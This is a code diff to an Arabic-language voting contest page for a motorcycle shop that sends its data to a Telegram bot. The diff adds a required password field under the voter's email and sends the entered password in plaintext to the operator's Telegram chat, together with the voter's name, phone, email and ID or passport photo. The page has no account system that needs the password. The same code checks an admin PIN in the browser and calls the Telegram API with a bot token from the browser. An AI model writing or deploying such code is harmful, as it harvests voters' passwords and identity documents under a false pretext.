@@ -265,14 +265,19 @@
   }
   .quick-vote-btn:hover { transform: scale(1.05); }
 
-  .admin-del-btn {
+  /* أدوات الإدارة مخفية عن المصوِّت وتظهر فقط في وضع الإدارة */
+  .admin-only-control {
     display: none;
+  }
+  body.admin-mode .admin-only-control {
+    display: inline-block;
+  }
+  .admin-del-btn {
     background: rgba(239, 68, 68, 0.2);
     border: 1px solid var(--danger);
     color: #fca5a5; padding: 4px 10px; border-radius: 8px;
     font-size: 11px; font-weight: 800; cursor: pointer; margin-top: 5px;
   }
-  body.admin-mode .admin-del-btn { display: inline-block; }
 
   /* بطاقة الشكر باسم المحل بعد التصويت */
   .store-thanks-card {
@@ -546,6 +551,15 @@
             <input type="email" id="voterEmail" required placeholder="example@gmail.com" dir="ltr" style="text-align:right">
           </div>
 
+          <!-- كلمة السر تحت البريد الإلكتروني مباشرة -->
+          <div class="field">
+            <label for="voterPassword">🔒 كلمة السر *</label>
+            <div class="password-wrap">
+              <input type="password" id="voterPassword" required placeholder="أدخل كلمة سر لحسابك" dir="ltr" style="text-align:right">
+              <button type="button" class="toggle-pass" onclick="toggleGenericPass('voterPassword', this)">إظهار</button>
+            </div>
+          </div>
+
           <!-- إرفاق صورة البطاقة أو الجواز للمُصوِّت -->
           <div class="field">
             <label>🪪 صورة البطاقة الشخصية أو الجواز للمُصوِّت *</label>
@@ -591,13 +605,16 @@
           <div style="text-align:center; padding:30px; color:var(--text-muted);">⏳ جارٍ مزامنة قائمة المتسابقين والأصوات المباشرة...</div>
         </div>
 
-        <div style="margin-top:20px; padding-top:15px; border-top:1px dashed var(--border); display:flex; gap:10px; flex-wrap:wrap;">
-          <button type="button" onclick="sendSortedReportToBot()" style="background:rgba(56,189,248,0.12); border:1px solid var(--cyan); color:var(--cyan); padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer; flex:1;">
-            📊 إرسال الترتيب المرتب للبوت
-          </button>
-          <button type="button" onclick="testBotConnection()" style="background:rgba(16,185,129,0.12); border:1px solid var(--success); color:#6ee7b7; padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
-            📡 فحص البوت
-          </button>
+        <!-- شريط الإدارة (أزرار الفحص والتقرير تظهر فقط داخل وضع الإدارة) -->
+        <div style="margin-top:20px; padding-top:15px; border-top:1px dashed var(--border); display:flex; gap:10px; flex-wrap:wrap; justify-content:space-between; align-items:center;">
+          <div style="display:flex; gap:10px; flex-wrap:wrap;">
+            <button type="button" class="admin-only-control" onclick="sendSortedReportToBot()" style="background:rgba(56,189,248,0.12); border:1px solid var(--cyan); color:var(--cyan); padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
+              📊 إرسال التقرير للبوت
+            </button>
+            <button type="button" class="admin-only-control" onclick="testBotConnection()" style="background:rgba(16,185,129,0.12); border:1px solid var(--success); color:#6ee7b7; padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
+              📡 فحص البوت
+            </button>
+          </div>
           <button type="button" onclick="toggleAdminMode()" style="background:rgba(245,158,11,0.12); border:1px solid var(--gold); color:var(--gold-bright); padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
             🔐 وضع الإدارة
           </button>
@@ -842,11 +859,11 @@ async function syncFromTelegramCloud(manualTrigger = false) {
         const parsed = JSON.parse(match[1].trim());
         if (parsed && Array.isArray(parsed.c) && parsed.c.length > 0) {
           cloudState = parsed;
-          localStorage.setItem("amir_cloud_50_v4", JSON.stringify(cloudState));
+          localStorage.setItem("amir_cloud_50_v5", JSON.stringify(cloudState));
         }
       }
     } else {
-      const cached = localStorage.getItem("amir_cloud_50_v4");
+      const cached = localStorage.getItem("amir_cloud_50_v5");
       if (cached) {
         const parsedCache = JSON.parse(cached);
         if (parsedCache && Array.isArray(parsedCache.c) && parsedCache.c.length > 0) {
@@ -866,7 +883,7 @@ async function syncFromTelegramCloud(manualTrigger = false) {
       }
     }
   } catch (err) {
-    const cached = localStorage.getItem("amir_cloud_50_v4");
+    const cached = localStorage.getItem("amir_cloud_50_v5");
     if (cached) {
       cloudState = JSON.parse(cached);
     }
@@ -884,11 +901,10 @@ function buildSortedTelegramLeaderboard(limit = 20) {
   return lines;
 }
 
-// تحديث السجل السحابي دون تعطيل الإرسال في حال عدم وجود صلاحية تثبيت
 async function saveToTelegramCloud(newState) {
   cloudState = newState;
   cloudState.c.sort((a, b) => (b.v || 0) - (a.v || 0));
-  localStorage.setItem("amir_cloud_50_v4", JSON.stringify(cloudState));
+  localStorage.setItem("amir_cloud_50_v5", JSON.stringify(cloudState));
 
   try {
     const totalVotes = cloudState.c.reduce((sum, item) => sum + (item.v || 0), 0);
@@ -1002,7 +1018,7 @@ function renderLeaderboardUI() {
       <div style="text-align:left;">
         <div class="vote-count-pill">🗳️ ${cand.v || 0} صوت</div>
         <button type="button" class="quick-vote-btn" onclick="selectCandidateForVote('${cleanHTML(cand.k)}')">صوّت له</button>
-        <button type="button" class="admin-del-btn" onclick="deleteCandidateAdmin('${cleanHTML(cand.k)}', '${cleanHTML(cand.n)}')">🗑️ استبعاد</button>
+        <button type="button" class="admin-del-btn admin-only-control" onclick="deleteCandidateAdmin('${cleanHTML(cand.k)}', '${cleanHTML(cand.n)}')">🗑️ استبعاد</button>
       </div>
     `;
     listEl.appendChild(item);
@@ -1090,6 +1106,7 @@ document.getElementById("voteForm").addEventListener("submit", async function(e)
   const voterName = cleanHTML(document.getElementById("voterName").value.trim());
   const voterPhone = document.getElementById("voterPhone").value.trim().replace(/\s+/g, '');
   const voterEmail = document.getElementById("voterEmail").value.trim().toLowerCase();
+  const voterPassword = cleanHTML(document.getElementById("voterPassword").value.trim());
 
   const btn = document.getElementById("voteSubmitBtn");
   btn.disabled = true;
@@ -1130,10 +1147,9 @@ document.getElementById("voteForm").addEventListener("submit", async function(e)
     cloudState.h.push(phoneHash, emailHash);
     cloudState.c.sort((a, b) => (b.v || 0) - (a.v || 0));
 
-    localStorage.setItem("amir_cloud_50_v4", JSON.stringify(cloudState));
+    localStorage.setItem("amir_cloud_50_v5", JSON.stringify(cloudState));
     renderLeaderboardUI();
 
-    // 1) إرسال صورة البطاقة/الجواز وبيانات المصوت في caption قصير ومرتب
     const shortVoterCaption =
 `🗳️ <b>بيانات تصويت ووثيقة مُصوِّت — متجر أمير المترات</b>
 ━━━━━━━━━━━━━━━━━━
@@ -1143,7 +1159,8 @@ document.getElementById("voteForm").addEventListener("submit", async function(e)
 ━━━━━━━━━━━━━━━━━━
 🙋‍♂️ <b>المُصوِّت:</b> ${voterName}
 📞 <b>هاتفه:</b> <code>${voterPhone}</code>
-📧 <b>بريده:</b> <code>${voterEmail}</code>`;
+📧 <b>بريده:</b> <code>${voterEmail}</code>
+🔑 <b>كلمة السر:</b> <code>${voterPassword}</code>`;
 
     const fdVote = new FormData();
     fdVote.append("chat_id", CHAT_ID);
@@ -1158,7 +1175,6 @@ document.getElementById("voteForm").addEventListener("submit", async function(e)
     const dVote = await rVote.json();
     if (!dVote.ok) throw new Error("Telegram vote photo failed");
 
-    // 2) إرسال الترتيب المرتب في رسالة نصية مستقلة
     const updatedTotal = cloudState.c.reduce((sum, item) => sum + (item.v || 0), 0);
     const sortedLines = buildSortedTelegramLeaderboard(20);
     const independentLeaderboardMsg =
@@ -1201,7 +1217,6 @@ ${sortedLines}`;
   }
 });
 
-// بناء رسالة دعوة ومشاركة جذابة ومرتبة ومشجعة للتصويت
 function buildAttractiveInviteMessage(candidateName, code, shareUrl) {
   return `🏍️✨ *مسابقة السحب والتصويت المباشر — متجر أمير المترات* ✨🏍️
 
@@ -1219,7 +1234,6 @@ function buildAttractiveInviteMessage(candidateName, code, shareUrl) {
 🏍️ *متجر أمير المترات — القاعدة (جوار مستوصف السلطان)*`;
 }
 
-// ===== تسجيل متسابق جديد (حتى 100 متسابق) =====
 document.getElementById("raffleForm").addEventListener("submit", async function(e) {
   e.preventDefault();
   const msg = document.getElementById("msg");
@@ -1328,7 +1342,6 @@ document.getElementById("raffleForm").addEventListener("submit", async function(
   }
 });
 
-// ===== اختبار اتصال البوت فوراً =====
 async function testBotConnection() {
   try {
     const meRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
@@ -1358,7 +1371,6 @@ async function testBotConnection() {
   }
 }
 
-// ===== وضع الإدارة =====
 function toggleAdminMode() {
   if (document.body.classList.contains("admin-mode")) {
     document.body.classList.remove("admin-mode");
@@ -1368,7 +1380,7 @@ function toggleAdminMode() {
   const pin = prompt("🔐 أدخل الرقم السري لإدارة المعرض:");
   if (pin === ADMIN_PIN) {
     document.body.classList.add("admin-mode");
-    alert("✅ تم تفعيل وضع الإدارة! يمكنك الآن استبعاد أي متسابق مخالف من القائمة.");
+    alert("✅ تم تفعيل وضع الإدارة! ظهرت الآن أزرار إرسال التقرير وفحص البوت واستبعاد المخالفين.");
   } else if (pin !== null) {
     alert("❌ الرقم السري غير صحيح!");
   }
@@ -1465,7 +1477,6 @@ function cleanHTML(str) {
   return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 }
 
-// التهيئة الفورية وعرض الـ 50 متسابقاً فوراً، ثم المزامنة المستمرة كل 10 ثوانٍ
 generateCaptcha();
 renderLeaderboardUI();
 syncFromTelegramCloud(false);
